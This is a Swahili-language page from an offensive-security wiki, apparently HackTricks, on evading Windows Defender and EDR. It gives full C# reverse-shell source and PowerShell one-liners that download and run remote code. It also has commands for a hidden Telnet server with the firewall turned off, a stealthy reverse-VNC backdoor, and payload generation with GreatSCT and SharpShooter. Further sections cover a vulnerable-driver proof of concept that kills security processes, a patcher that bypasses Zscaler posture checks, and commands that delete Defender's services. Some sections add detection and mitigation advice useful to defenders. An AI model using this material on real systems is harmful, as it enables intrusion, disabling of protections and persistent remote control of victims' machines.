Haya pia ni mazungumzo mengine mazuri kutoka kwa [@mariuszbit](https://twitter.com/mariuszbit) kuhusu kukwepa ugunduzi kwa kina.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Mbinu za Zamani**

### **Angalia ni sehemu zipi Defender huona kuwa hasidi**

Unaweza kutumia [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), ambayo **huondoa sehemu za binary** hadi **igundue ni sehemu ipi Defender** inaona kuwa hasidi na kukutenganishia sehemu hiyo.\
Tool nyingine inayofanya **jambo lilelile ni** [**avred**](https://github.com/dobin/avred), inayotoa huduma hiyo kupitia tovuti katika [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hadi Windows10, Windows zote zilikuja na **Telnet server** ambayo ungeweza kuisakinisha (kama administrator) kwa kufanya:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Ifanye **ianze** mfumo unapoanzishwa na **uiendeshe** sasa:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Badilisha port ya telnet** (stealth) na uzime firewall:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Pakua kutoka: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (unahitaji vipakuliwa vya bin, si setup)

**KWENYE HOST**: Tekeleza _**winvnc.exe**_ na usanidi server:

- Washa chaguo la _Disable TrayIcon_
- Weka nenosiri kwenye _VNC Password_
- Weka nenosiri kwenye _View-Only Password_

Kisha, hamisha binary _**winvnc.exe**_ na faili _**UltraVNC.ini**_ lililoundwa **hivi karibuni** ndani ya **victim**

#### **Reverse connection**

**Attacker** anapaswa **kutekeleza ndani ya** **host** yake binary `vncviewer.exe -listen 5900` ili iwe **tayari** kupokea **reverse VNC connection**. Kisha, ndani ya **victim**: Anzisha daemon ya winvnc `winvnc.exe -run` na utekeleze `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ONYO:** Ili kudumisha usiri, hupaswi kufanya mambo kadhaa

- Usianzishe `winvnc` ikiwa tayari inafanya kazi, la sivyo utasababisha [popup](https://i.imgur.com/1SROTTl.png). Angalia ikiwa inafanya kazi kwa kutumia `tasklist | findstr winvnc`
- Usianzishe `winvnc` bila `UltraVNC.ini` kwenye saraka hiyo hiyo, la sivyo [dirisha la usanidi](https://i.imgur.com/rfMQWcf.png) litafunguka
- Usiendeshe `winvnc -h` kwa ajili ya msaada, la sivyo utasababisha [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Pakua kutoka: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Ndani ya GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Sasa **anzisha lister** kwa `msfconsole -r file.rc` na **tekeleza** **xml payload** kwa:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Defender wa sasa utasitisha mchakato haraka sana.**

### Kukompile reverse shell yetu wenyewe

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Reverse shell ya kwanza ya C#

Ikukompile kwa kutumia:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Itumie pamoja na:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# kwa kutumia compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa kiotomatiki:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Orodha ya C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kujenga mifano ya injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Zana nyingine

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Zaidi

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kuua AV/EDR kutoka Kernel Space

Storm-2603 ilitumia zana ndogo ya console inayojulikana kama **Antivirus Terminator** kuzima ulinzi wa endpoint kabla ya kusambaza ransomware. Zana hii huja na **driver yake yenye udhaifu lakini *iliyotiwa sahihi*** na kuitumia vibaya kutekeleza shughuli za kernel zenye mamlaka ya juu ambazo hata huduma za AV za Protected-Process-Light (PPL) haziwezi kuzuia.<sup>[[12]](#references)</sup>

Mambo muhimu ya kukumbuka
1. **Driver iliyotiwa sahihi**: Faili inayowasilishwa kwenye diski ni `ServiceMouse.sys`, lakini binary ni driver iliyotiwa sahihi kihalali `AToolsKrnl64.sys` kutoka kwenye “System In-Depth Analysis Toolkit” ya Antiy Labs. Kwa kuwa driver ina saini halali ya Microsoft, hupakiwa hata wakati Driver-Signature-Enforcement (DSE) imewashwa.
2. **Usakinishaji wa service**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Mstari wa kwanza husajili driver kama **kernel service** na wa pili huiwasha ili `\\.\ServiceMouse` ipatikane kutoka userland.
3. **IOCTLs zinazotolewa na driver**
   | IOCTL code | Uwezo                                  |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Kusitisha process yoyote kwa PID (hutumika kuua huduma za Defender/EDR) |
   | `0x990000D0` | Kufuta faili yoyote kwenye diski |
   | `0x990001D0` | Kupakua driver na kuondoa huduma |

   Mfano mdogo wa uthibitisho wa dhana wa C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Kwa nini inafanya kazi**: BYOVD hupita kabisa ulinzi wa user-mode; msimbo unaotekelezwa kwenye kernel unaweza kufungua michakato *iliyolindwa*, kuisitisha, au kuchezea objects za kernel bila kujali vipengele vya hardening kama PPL/PP, ELAM au vingine.

Utambuzi / Kupunguza Hatari  
• Washa orodha ya Microsoft ya madereva hatarishi yaliyofungiwa (`HVCI`, `Smart App Control`) ili Windows ikatae kupakia `AToolsKrnl64.sys`.  
• Fuatilia uundaji wa huduma mpya za *kernel* na toa arifa dereva anapopakiwa kutoka kwenye saraka inayoweza kuandikiwa na kila mtu au hayupo kwenye allow-list.  
• Fuatilia handles za user-mode kwenye objects maalum za kifaa, zikifuatiwa na miito ya kutiliwa shaka ya `DeviceIoControl`.

### Kupita Ukaguzi wa Mkao wa Zscaler Client Connector kwa Kurekebisha Binaries kwenye Diski

**Client Connector** ya Zscaler hutekeleza sheria za mkao wa kifaa kwenye kifaa husika na hutegemea Windows RPC kuwasilisha matokeo kwa vipengele vingine. Chaguo mbili dhaifu za usanifu huwezesha kupita ukaguzi kabisa:

1. Tathmini ya mkao hufanyika **upande wa client pekee** (thamani ya boolean hutumwa kwa server).
2. RPC endpoints za ndani hukagua tu kwamba executable inayounganisha **imetia saini na Zscaler** (kupitia `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Kwa **kurekebisha binaries nne zilizotiwa saini kwenye diski**, mifumo yote miwili inaweza kuzimwa:

| Binary | Mantiki ya awali iliyorekebishwa | Matokeo |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Hurejesha `1` kila mara, hivyo kila ukaguzi huonekana kuwa umetimiza masharti |
| `ZSAService.exe` | Mwito usio wa moja kwa moja wa `WinVerifyTrust` | NOP-ed ⇒ mchakato wowote (hata ambao haujasainiwa) unaweza kuunganisha kwenye RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Hubadilishwa na `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Ukaguzi wa uadilifu wa tunnel | Hupitishwa kwa njia ya mkato |

Sehemu ndogo ya patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Baada ya kubadilisha faili asili na kuwasha upya service stack:

* **Ukaguzi wote** wa posture huonyesha **green/compliant**.
* Binaries ambazo hazijasainiwa au zimebadilishwa zinaweza kufungua endpoints za named-pipe RPC (k.m. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Host iliyoathiriwa hupata ufikiaji usio na vizuizi kwenye mtandao wa ndani uliofafanuliwa na sera za Zscaler.

Uchunguzi huu unaonyesha jinsi maamuzi ya uaminifu yanayofanywa upande wa client pekee, pamoja na ukaguzi rahisi wa sahihi, yanavyoweza kushindwa kwa kubadilisha byte chache.

## Matumizi mabaya ya utendaji unaoaminika wa Microsoft Defender `BTR.sys`

Driver ya **Boot-Time Removal** ya Defender ni mfano mzuri wa kulinganisha na BYOVD ya kawaida. `BTR.sys` ni component halali ya Microsoft iliyosainiwa kwa ajili ya remediation, haina bug ya memory-corruption wala interface ya IOCTL; badala yake, baada ya kupata ufikiaji wa administrator na `SeLoadDriverPrivilege`, operator anaweza kughushi transaction yake binafsi ya remediation na kupata uwezo uliokusudiwa wa kufanya operesheni za faili/registry za Ring-0. Hiki ni **primitive ya kuzima AV/EDR baada ya mfumo kuathiriwa, si ufikiaji wa awali wala kupandisha marupurupu**, na driver inaweza kutolewa kutoka kwenye resource ya `BOOTTIMETOOL` ya `MpEngine.dll` ya target yenyewe badala ya kuleta driver ya mtu mwingine inayoweza kuvutia mashaka.<sup>[[36]](#references)</sup>

### Kuweka driver ya matumizi ya mara moja

Kwa kawaida, Defender huweka resource hiyo kama faili la nasibu la `[a-z]{8}.sys` na kusajili kernel service yenye jina linalofanana. `DriverEntry` husoma thamani ya `Args` ya service, hufungua NTFS ADS iliyorejelewa, hufungua usimbaji na kuthibitisha orodha ya vitendo, huandika feedback, kisha hurejesha `0xC0000056` (`STATUS_DELETE_PENDING`) baada ya utekelezaji kufanikiwa ili driver ijiondoe badala ya kubaki kwenye kumbukumbu. Service iliyoghushiwa huwa na thamani bainifu zifuatazo.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Mkondo wa `:changelist` una blob moja iliyosimbwa kwa RC4. Builds zilizochanganuliwa hutumia tena key isiyobadilika ya baiti 256, kwa hiyo usimbaji fiche si mpaka wa uidhinishaji. Plaintext halali ina header ya jumla ya baiti 24 (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC ya header na transaction ID inayotokana na payload), ikifuatiwa na njia ya feedback ya UTF-16 iliyomalizika kwa null na idadi yoyote ya vipengee. Kila kipengee kina header ya baiti 16 (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) pamoja na data mahususi ya action inayoishia kwa **baiti NUL nne haswa**. Kila eneo la header/data hukaguliwa kivyake kwa CRC-32 polynomial `0xEDB88320`, hali ya awali `0xFFFFFFFF`, na **bila XOR ya mwisho** (`~CRC32`); hali ya CRC huwekwa upya kwa kila eneo.<sup>[[36]](#references)[[37]](#references)</sup>

Vitambulisho vya action vinavyokubaliwa hufichua primitives hizi za kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Data ya kipengee | Matokeo |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Futa faili, hata ikiwa imefungwa |
| 2 | `[UTF-16 path]` | Ondoa directory tupu |
| 3 | `[Flags][source][destination]` | Hamisha faili hadi kwenye path iliyolindwa iliyochaguliwa na mshambuliaji; destination tupu humaanisha kufuta |
| 4 | `[Flags][key path]` | Futa registry key kwa kujirudia |
| 5 | `[Flags][key path + "\\" + value]` | Futa thamani ya registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Unda/sasisha thamani ya registry na uunde njia za key zinazokosekana |

Kwa actions 5 na 6, kitenganishi cha key/value kwenye data ya waya ni **backslash mbili mfululizo**; njia iliyopangiliwa kwa kawaida haitatenganishwa ipasavyo. Faili ya feedback kwa kiasi kikubwa huakisi ombi, lakini baiti nne za kwanza za data ya kila kipengee huwa `NTSTATUS` yake inayotokana. Kwa actions 1 na 2, ambazo hazina sehemu ya flags mwanzoni, BTR huhamisha path hadi kwenye baiti nne za mwisho zilizohifadhiwa ili kutenga nafasi ya status hiyo.<sup>[[36]](#references)</sup>

### Mchakato wa `BTR_CLI` na kipindi cha mapema wakati wa kuwasha

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) hutekeleza mnyororo mzima: hutoa `BTR.sys` kutoka Defender ya ndani, huunda `<random>.sys:changelist` na mkondo wa feedback, husarifu/kukokotoa checksum/kusimba kwa actions zilizounganishwa, huunda moja kwa moja registry key ya service, kisha huita `NtLoadDriver` kwa `-trigger now` au huiacha kama driver ya kuanza na mfumo kwa `-trigger boot`. Kuweka taarifa moja kwa moja kwenye registry huepuka njia ya kawaida ya SCM `CreateServiceW` na kwa hiyo **hakuzalishi** Service-install Event ID 7045. Vitu vilivyoundwa kwa trigger ya kuwasha mfumo vinaweza kuondolewa baadaye kwa `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` haitumiki kwa sababu BTR hufanya shughuli za I/O ya faili kutoka `DriverEntry` kabla stack ya hifadhi na kiungo cha `SystemRoot` kuwa tayari. `Start=1` pamoja na kundi lenye kipaumbele cha juu la `Boot Bus Extender` badala yake hutekelezwa katika Phase 1: NTFS inaweza kutumika, lakini viendeshi vingi vya usalama vinavyoanza na mfumo na huduma za EDR za user-mode bado hazijaanzishwa. Vichujio vya boot-start kama `WdFilter` huenda tayari vimepakiwa, lakini BTR inaweza kuondoa binary zake au usanidi wa huduma kabla ya uanzishaji unaofuata, na inaweza kufuta executable za huduma kabla SCM haijazizindua. ELAM haifungi mwanya huu kwa sababu BTR huendeshwa baada ya tathmini ya boot-start na ina sahihi halali ya Microsoft.<sup>[[36]](#references)</sup>

Vitendo vingi hutekelezwa katika transaction moja. PoC huweka Action 1 mwanzoni kwa `\SystemRoot\Temp\BootClean.log` iliyowekwa moja kwa moja: BTR huunda logi hii, kisha hutekeleza ombi lake la kuifuta na kuiondoa kabla ya kujiondoa. Hii hupunguza ushahidi, huku kuweka mrejesho katika `<random>.sys:<random>.dat` kukiruhusu kuondoa kiendeshi na streams zote mbili kwa pamoja.<sup>[[36]](#references)[[37]](#references)</sup>

### Uhusiano wa ugunduzi wenye ishara ya juu

Kanuni zinazotegemea sahihi pekee na orodha ya Microsoft ya kuzuia viendeshi vilivyo hatarishi hazishughulikii matumizi mabaya ya utendaji uliokusudiwa wa BTR. Pendelea uhusiano huu wa kitabia, huku ukitofautisha asili halali ya Defender na programu yoyote ya kiholela ya kuzindua.<sup>[[36]](#references)</sup>

- **Sysmon 15:** uundaji wa `.sys:changelist` ni wa kawaida kwa uwekaji wa BTR. ADS ya `.dat` iliyoambatishwa kwa `.sys` hiyo hiyo inatia shaka zaidi, kwa sababu Defender halali kwa kawaida huweka mrejesho chini ya `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 bila System 7045:** husisha uundaji wa moja kwa moja wa `HKLM\SYSTEM\CurrentControlSet\Services\<random>` yenye `Args=...:changelist` na `Group=Boot Bus Extender` na kutokuwepo kwa tukio linalolingana la usakinishaji wa SCM.
- **Sysmon 6 -> 23:** husisha upakiaji wa kiendeshi cha BTR kinachojulikana, kutoka asili isiyo ya Defender, na ufutaji wa faili unaofuata unaohusishwa na `System`/PID 4, hasa kwa binary za usalama.
- **Sysmon 11 -> 23:** toa arifa kuhusu uundaji na ufutaji wa haraka wa `\SystemRoot\Temp\BootClean.log` unaofanywa na `System`/PID 4.
- Zuia na kagua utoaji/uwezeshaji wa `SeLoadDriverPrivilege`; sahihi ya Microsoft pekee haitoshi kuthibitisha uaminifu wakati kiendeshi cha zana ya usalama kinapowekwa na `cmd.exe`, PowerShell, au mchakato usiojulikana.

## Kutumia Vibaya Protected Process Light (PPL) Kuharibu AV/EDR Kwa LOLBINs

Protected Process Light (PPL) hutekeleza ngazi ya signer/level ili michakato iliyolindwa yenye kiwango sawa au cha juu tu iweze kuharibu mingine. Kwa upande wa mashambulizi, ukiweza kuzindua kihalali binary iliyowezeshwa kwa PPL na kudhibiti argument zake, unaweza kubadilisha utendaji usio na madhara (k.m., logging) kuwa primitive yenye vizuizi ya kuandika, inayoungwa mkono na PPL, dhidi ya directory zilizolindwa zinazotumiwa na AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Kinachofanya mchakato uendeshwe kama PPL
- EXE lengwa (na DLL zozote zilizopakiwa) lazima zisainiwe kwa EKU inayoweza kutumia PPL.
- Mchakato lazima uundwe kwa CreateProcess kwa kutumia flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Kiwango cha ulinzi kinachooana na signer wa binary lazima kiombwe (k.m., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` kwa signers wa anti-malware, `PROTECTION_LEVEL_WINDOWS` kwa signers wa Windows). Viwango visivyo sahihi vitasababisha uundaji kushindwa.

Tazama pia utangulizi mpana zaidi wa PP/PPL na ulinzi wa LSASS hapa:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Zana za kuzindua
- Msaidizi wa open-source: CreateProcessAsPPL (huchagua kiwango cha ulinzi na kusambaza argument kwa EXE lengwa):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Muundo wa matumizi:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Binary ya mfumo iliyosainiwa `C:\Windows\System32\ClipUp.exe` huanzisha mchakato mwingine na hukubali kigezo cha kuandika faili ya logi kwenye njia iliyobainishwa na mwito.
- Inapozinduliwa kama mchakato wa PPL, uandishi wa faili hufanyika kwa kutumia ulinzi wa PPL.
- ClipUp haiwezi kuchanganua njia zilizo na nafasi; tumia njia fupi za 8.3 kuelekeza kwenye maeneo ambayo kwa kawaida yanalindwa.

8.3 short path helpers
- Orodhesha majina mafupi: `dir /x` katika kila saraka kuu.
- Pata njia fupi katika cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Mlolongo wa matumizi mabaya (muhtasari)
1) Zindua LOLBIN inayoweza kutumia PPL (ClipUp) kwa kutumia `CREATE_PROTECTED_PROCESS` kupitia launcher (kwa mfano, CreateProcessAsPPL).
2) Pitisha kigezo cha njia ya logi ya ClipUp ili kulazimisha kuundwa kwa faili katika saraka ya AV iliyolindwa (kwa mfano, Defender Platform). Tumia majina mafupi ya 8.3 inapohitajika.
3) Ikiwa binary lengwa kwa kawaida hufunguliwa/kufungwa na AV inapokuwa inafanya kazi (kwa mfano, MsMpEng.exe), panga uandishi wakati wa kuwasha kompyuta kabla ya AV kuanza kwa kusakinisha huduma ya kuanza kiotomatiki ambayo huendeshwa mapema kwa uhakika. Thibitisha mpangilio wa kuwasha kompyuta kwa kutumia Process Monitor (boot logging).
4) Kompyuta inapowashwa upya, uandishi unaotumia PPL hufanyika kabla ya AV kufunga binary zake, na hivyo kuharibu faili lengwa na kuzuia kuwaka kwake.

Mfano wa mwito (njia zimefichwa/kufupishwa kwa usalama):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Vidokezi na vikwazo
- Huwezi kudhibiti maudhui ambayo ClipUp huandika, zaidi ya mahali yanapoandikwa; primitive hii inafaa kwa kuharibu data badala ya kuingiza maudhui sahihi.
- Inahitaji local admin/SYSTEM ili kusakinisha/kuanzisha service, pamoja na fursa ya kuwasha upya mfumo.
- Muda ni muhimu: faili lengwa haipaswi kuwa wazi; utekelezaji wakati wa kuwasha mfumo huepusha kufungwa kwa faili.

Ugunduzi
- Uundaji wa mchakato wa `ClipUp.exe` wenye argument zisizo za kawaida, hasa ikiwa umeanzishwa na launcher zisizo za kawaida, wakati wa kuwasha mfumo.
- Services mpya zilizosanidiwa kuwasha binaries zinazotiliwa shaka kiotomatiki na kuanza mara kwa mara kabla ya Defender/AV. Chunguza uundaji/urekebishaji wa service kabla ya kushindwa kwa Defender kuanza.
- Ufuatiliaji wa uadilifu wa faili za Defender/katalogi za Platform; uundaji/urekebishaji usiotarajiwa wa faili na michakato yenye protected-process flags.
- Telemetry ya ETW/EDR: tafuta michakato iliyoundwa kwa kutumia `CREATE_PROTECTED_PROCESS` na matumizi yasiyo ya kawaida ya kiwango cha PPL na binaries zisizo za AV.

Hatua za kupunguza hatari
- WDAC/Code Integrity: zuia ni binaries zipi zilizotiwa saini zinaweza kuendeshwa kama PPL na chini ya parents zipi; zuia matumizi ya ClipUp nje ya miktadha halali.
- Usimamizi wa services: punguza uwezo wa kuunda/kurekebisha services zinazojiwasha kiotomatiki na fuatilia udanganyifu wa mpangilio wa kuanza.
- Hakikisha ulinzi wa Defender dhidi ya tampering na ulinzi wa early-launch umewashwa; chunguza hitilafu za kuanza zinazoashiria uharibifu wa binary.
- Fikiria kuzima utengenezaji wa majina mafupi ya 8.3 kwenye volumes zinazohifadhi zana za usalama ikiwa kunalingana na mazingira yako (fanya majaribio ya kina).

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender huchagua platform itakayotumia kwa kuorodhesha folda ndogo chini ya:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Huchagua folda ndogo yenye mfuatano wa toleo ulio juu zaidi kwa mpangilio wa lexicographic (kwa mfano, `4.18.25070.5-0`), kisha huanzisha michakato ya service ya Defender kutoka humo (ikisasisha njia za service/registry ipasavyo). Uteuzi huu huamini maingizo ya katalogi, yakiwemo directory reparse points (symlinks). Administrator anaweza kutumia hili kuelekeza Defender kwenye njia inayoweza kuandikwa na attacker na kufanikisha DLL sideloading au kuvuruga service.<sup>[[21]](#references)[[22]](#references)</sup>

Masharti ya awali
- Local Administrator (inahitajika ili kuunda katalogi/symlinks chini ya folda ya Platform)
- Uwezo wa kuwasha upya mfumo au kuchochea uteuzi upya wa Defender platform (service huanzishwa upya wakati wa kuwasha mfumo)
- Zana zilizojengewa ndani pekee zinahitajika (mklink)

Kwa nini inafanya kazi
- Defender huzuia uandikaji katika folda zake, lakini uteuzi wake wa platform huamini maingizo ya katalogi na kuchagua toleo la juu zaidi kwa mpangilio wa lexicographic bila kuthibitisha kuwa lengwa linaelekezwa kwenye njia iliyolindwa/kuaminika.

Hatua kwa hatua (mfano)
1) Andaa nakala inayoweza kuandikwa ya folda ya sasa ya platform, kwa mfano `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
